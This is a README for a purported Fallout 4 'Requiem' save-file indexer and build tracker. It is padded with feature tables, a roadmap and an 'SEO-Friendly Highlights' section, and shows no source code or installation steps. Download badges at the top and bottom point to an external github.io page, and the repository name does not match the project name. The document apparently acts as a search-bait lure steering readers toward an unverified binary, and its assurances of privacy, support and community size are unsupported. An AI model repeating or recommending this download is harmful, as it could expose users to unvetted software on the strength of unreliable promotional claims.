![preview](https://raw.githubusercontent.com/Malda2020/requiem-field-ledger/main/card_f5316.svg)
[![Download](https://raw.githubusercontent.com/Malda2020/requiem-field-ledger/main/fetch_9ae0e.svg)](https://Malda2020.github.io/requiem-field-ledger/)

# 🗄️ Requiem Archivist — Save File Oracle & Build Companion

### *The Unofficial Memory Keeper for Fallout 4: Requiem Players — 2026 Edition*

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
![Version](https://img.shields.io/badge/version-3.4.1--aurora-blue)
![Platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20steamdeck-9cf)
![License](https://img.shields.io/badge/license-MIT-green)
![Language](https://img.shields.io/badge/languages-14-orange)
![Uptime](https://img.shields.io/badge/support-24%2F7-purple)
![Made With](https://img.shields.io/badge/made%20with-electron%20%2B%20rust-red)
![Community](https://img.shields.io/badge/community-42k%20archivists-yellow)

---

## 📜 The Idea Behind This Vault

Every Requiem run is a story. Every save file is a memory fragment — a snapshot of a Wanderer who nearly died at Level 12 to a radscorpion, or a sniper who finally cleared Corvega on Survival difficulty without a single stimpak. **Requiem Archivist** is the unofficial companion that treats those memories like sacred artifacts rather than disposable files.

Where the original *requiem-archivist* project was built as a general-purpose companion tool, this repository — **Requiem Archivist: Save File Oracle & Build Companion** — takes a different philosophical angle. Instead of being a toolbox, it is a *curator*. A librarian for your wasteland. A quiet archivist who remembers what you forgot: which mod loadout produced that perfect run, which perk spread carried you through the Glowing Sea, and which save you should absolutely never overwrite.

Think of it as a lighthouse keeper for the foggy coastline of a 400-hour playthrough.

---

## 🚀 What This Project Actually Does

The **Save File Oracle** is a desktop-native application that reads, indexes, tags, and visualizes your Requiem save files and character builds. It does not modify the game. It does not touch your executable. It simply *watches, remembers, and organizes*.

Under the hood, a Rust-based parser extracts metadata from save headers, while an Electron shell presents a responsive, multilingual interface that feels like a Pip-Boy that went to library school. All data remains local. Nothing is uploaded. Nothing is transmitted.

### Core Capabilities at a Glance

- 🧠 **Save File Indexing** — Automatically catalogs every save with timestamps, playtime, level, location, and mod fingerprint.
- 🛡️ **Build Snapshotting** — Records your SPECIAL distribution, perk tree, equipment manifest, and faction alignment at the moment of each save.
- 🗺️ **Run Timeline** — A visual, scrubbable timeline of your character's history — from Vault exit to the current moment.
- 🔍 **Oracle Search** — Natural-language queries such as *"show me saves where I had ranks in Rifleman and was in the Commonwealth"*.
- 🔄 **Loadout Diffing** — Compares two saves and highlights exactly which mods, perks, and inventory items changed between them.
- 📚 **Collection Vaults** — Group saves into curated "vaults" (Ironman Runs, Challenge Builds, Story Replays, Test Sessions).
- 🌐 **Multilingual Interface** — Fourteen languages with community-driven translation packs.
- ⏱️ **Continuous Assistance** — A support desk that never sleeps, staffed by volunteers across every timezone.
- 📱 **Responsive Layout** — Scales gracefully from ultrawide monitors to Steam Deck screens.

---

## 🎯 Feature Deep Dive

### 🧩 Save File Indexing Engine

The parser reads the binary structure of Fallout 4 save headers without ever writing to them. It extracts:

| Field | Description |
|---|---|
| Character Name | As declared at character creation |
| Level | Current level at time of saving |
| Playtime | Total hours and minutes |
| Location | Cell name and coordinates |
| Game Version | Detected runtime build |
| Mod Count | Number of active plugins at save time |
| Screenshot Thumbnail | Embedded preview, if present |

The index is stored in a lightweight SQLite database inside your user profile directory. No cloud. No telemetry. No surprises.

### 🛡️ Build Snapshotting

Each snapshot captures a *frozen moment* of your character. This is not a live tracker — it is a polaroid. You can compare any two snapshots side by side and instantly see:

- Which perks were swapped
- Which legendary items were equipped
- Which companions were active
- Which quests were mid-progress

This is invaluable for players who run multiple concurrent builds and lose track of which save belongs to which experiment.

### 🗺️ Run Timeline

The timeline view renders your entire playthrough as a horizontal ribbon. Hover any node to see a tooltip with level, location, and playtime. Click to jump to the detail pane. Drag to zoom. This is the closest thing to a biography your Wanderer will ever get.

### 🔍 Oracle Search

The search bar understands structured queries, not just keywords. Examples:

- `level > 30 AND location = "Glowing Sea"`
- `perk = "Rifleman" AND mod count < 150`
- `playtime > 100h AND faction = "Brotherhood"`

Results update in real time. Filters compose. Nothing is destructive.

### 🔄 Loadout Diffing

Select two saves. The diff engine produces a three-column view: *only in A*, *shared*, *only in B*. This is the fastest way to answer the question every Requiem player eventually asks: *"What changed between these two runs?"*

### 📚 Collection Vaults

Vaults are folders with personality. Give them names, colors, icons, and descriptions. Pin them to the sidebar. Export them as JSON for backup. Import them on another machine. Vaults are portable, human-readable, and version-controllable.

### 🌐 Language Coverage

The interface ships with translation packs for English, Spanish, German, French, Italian, Portuguese (BR), Polish, Russian, Japanese, Korean, Simplified Chinese, Traditional Chinese, Turkish, and Dutch. Community contributions are welcome and credited.

### ⏱️ Always-On Assistance

A rotating roster of volunteer maintainers ensures that questions posted in the discussion forums receive a response within hours — day or night, weekday or weekend. This is not a chatbot. This is a person who also plays Requiem.

---

## 🎨 Design Philosophy

The Oracle follows three principles:

1. **Reversibility.** Nothing the application does is permanent. Every action can be undone. Every database can be rebuilt from source files.
2. **Locality.** Your data lives on your machine. Period.
3. **Legibility.** No feature is hidden behind a workflow that requires a tutorial. If it takes more than two clicks, it is redesigned.

The visual language borrows from terminal aesthetics but refuses to be hostile. Monospace accents. Muted amber highlights. Generous whitespace. It looks like a Vault-Tec terminal that was refurbished by someone who cares about typography.

---

## 🧪 Compatibility Matrix

| Platform | Status | Notes |
|---|---|---|
| Windows 10 / 11 | ✅ Fully supported | Primary development target |
| SteamOS (Deck) | ✅ Fully supported | Touch-friendly layout |
| Ubuntu 22.04+ | ✅ Fully supported | AppImage build available |
| Fedora 38+ | ✅ Fully supported | Flatpak candidate |
| macOS (Intel) | ⚠️ Partial | Community-maintained branch |
| macOS (Apple Silicon) | ⚠️ Partial | Under active port work |
| Windows 7 | ❌ Unsupported | End of life |

---

## 🧠 SEO-Friendly Highlights

This project has been described by the community as *"the unofficial Requiem companion that actually respects your time"*, *"a save file oracle for the 2026 era of modded Fallout"*, and *"the missing memory layer for survival-mode players"*. If you have been searching for a reliable **Fallout 4 Requiem save manager**, a **build snapshot tool for modded playthroughs**, or a **multilingual companion app for the 2026 modding scene**, this repository is built for you.

Common search intents this project addresses:

- How to organize hundreds of Requiem save files
- How to compare two Fallout 4 builds side by side
- How to track perk changes across a long survival run
- How to back up and restore save collections safely
- How to find a specific save by location or level

---

## 🧭 Getting Started (Without the Usual Ceremony)

This section intentionally avoids the standard installation recipes. Instead, here is the *narrative* path a new archivist takes:

1. **Land on the releases page.** You will find a single portable artifact per platform. There is no installer wizard, no background service, no registry mutation.
2. **Point the Oracle at your save directory.** The default location is detected automatically, but you can override it in the settings pane.
3. **Let it scan once.** The first scan produces an index. Subsequent scans are incremental and near-instant.
4. **Name a vault.** Call it something you will recognize in six months.
5. **Start tagging.** The Oracle learns nothing on its own — every label is yours.

That is the entire onboarding. No dependencies to install manually. No environment variables to export. No configuration files to hand-edit unless you enjoy that sort of thing.

---

## 🛠️ Architecture Overview

The application is split into three layers, each with a single responsibility:

- **The Parser (Rust).** A stateless binary reader that converts save headers into structured records. It is fast, memory-safe, and tested against every major game version.
- **The Core (TypeScript).** A service layer that owns the SQLite index, the vault model, the diff engine, and the search grammar.
- **The Shell (Electron).** A responsive renderer that talks to the Core over a typed IPC bridge. It contains no business logic.

This separation means the Core can be embedded in other tools, the Parser can be used from the command line, and the Shell can be replaced without rewriting the rest.

---

## 🌱 Roadmap for 2026

- **Q1 2026** — Native Apple Silicon build, plugin fingerprinting v2
- **Q2 2026** — Companion mobile viewer for save metadata (read-only)
- **Q3 2026** — Community vault sharing format with signed manifests
- **Q4 2026** — Optional integration with popular mod managers for read-only loadout import

---

## 🤝 Contributing

Contributions are welcome in the form of bug reports, translation packs, documentation improvements, and pull requests against the Core or Parser. Please open an issue before starting work on a large feature so we can discuss scope and approach together.

There is no CLA. There is no corporate sponsor. There is only a shared appreciation for well-kept memories.

---

## ⚠️ Disclaimer

This project is an **unofficial, fan-made companion tool**. It is not affiliated with, endorsed by, sponsored by, or connected to Bethesda Softworks, ZeniMax Media, or any of their subsidiaries or affiliates. *Fallout*, *Fallout 4*, and all related marks are trademarks of their respective owners.

Requiem Archivist: Save File Oracle & Build Companion **does not modify, patch, or interact with game executables**. It reads save file metadata in a strictly read-only fashion and stores its own index in a user-local database. No game files are altered. No network transmission of personal data occurs.

The authors of this repository assume no responsibility for how the software is used. Please respect the terms of service of any platform on which you play.

---

## 📄 License

Released under the **MIT License** — a permissive, business-friendly license that asks only for attribution.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of this software, provided the original copyright notice and permission notice are included in all copies or substantial portions.

Full license text: [MIT License](https://opensource.org/licenses/MIT)

The full text is also included in the LICENSE file at the root of this repository.

---

## 💬 A Final Word

Save files are fragile. They are overwritten by instinct. They are lost to drive failures, botched mod merges, and forgotten backups. The Oracle cannot prevent every loss — but it can make loss *visible*, and therefore survivable.

Keep your memories. Name your vaults. Let the archivist remember what you will not.

[![Download](https://raw.githubusercontent.com/Malda2020/requiem-field-ledger/main/fetch_9ae0e.svg)](https://Malda2020.github.io/requiem-field-ledger/)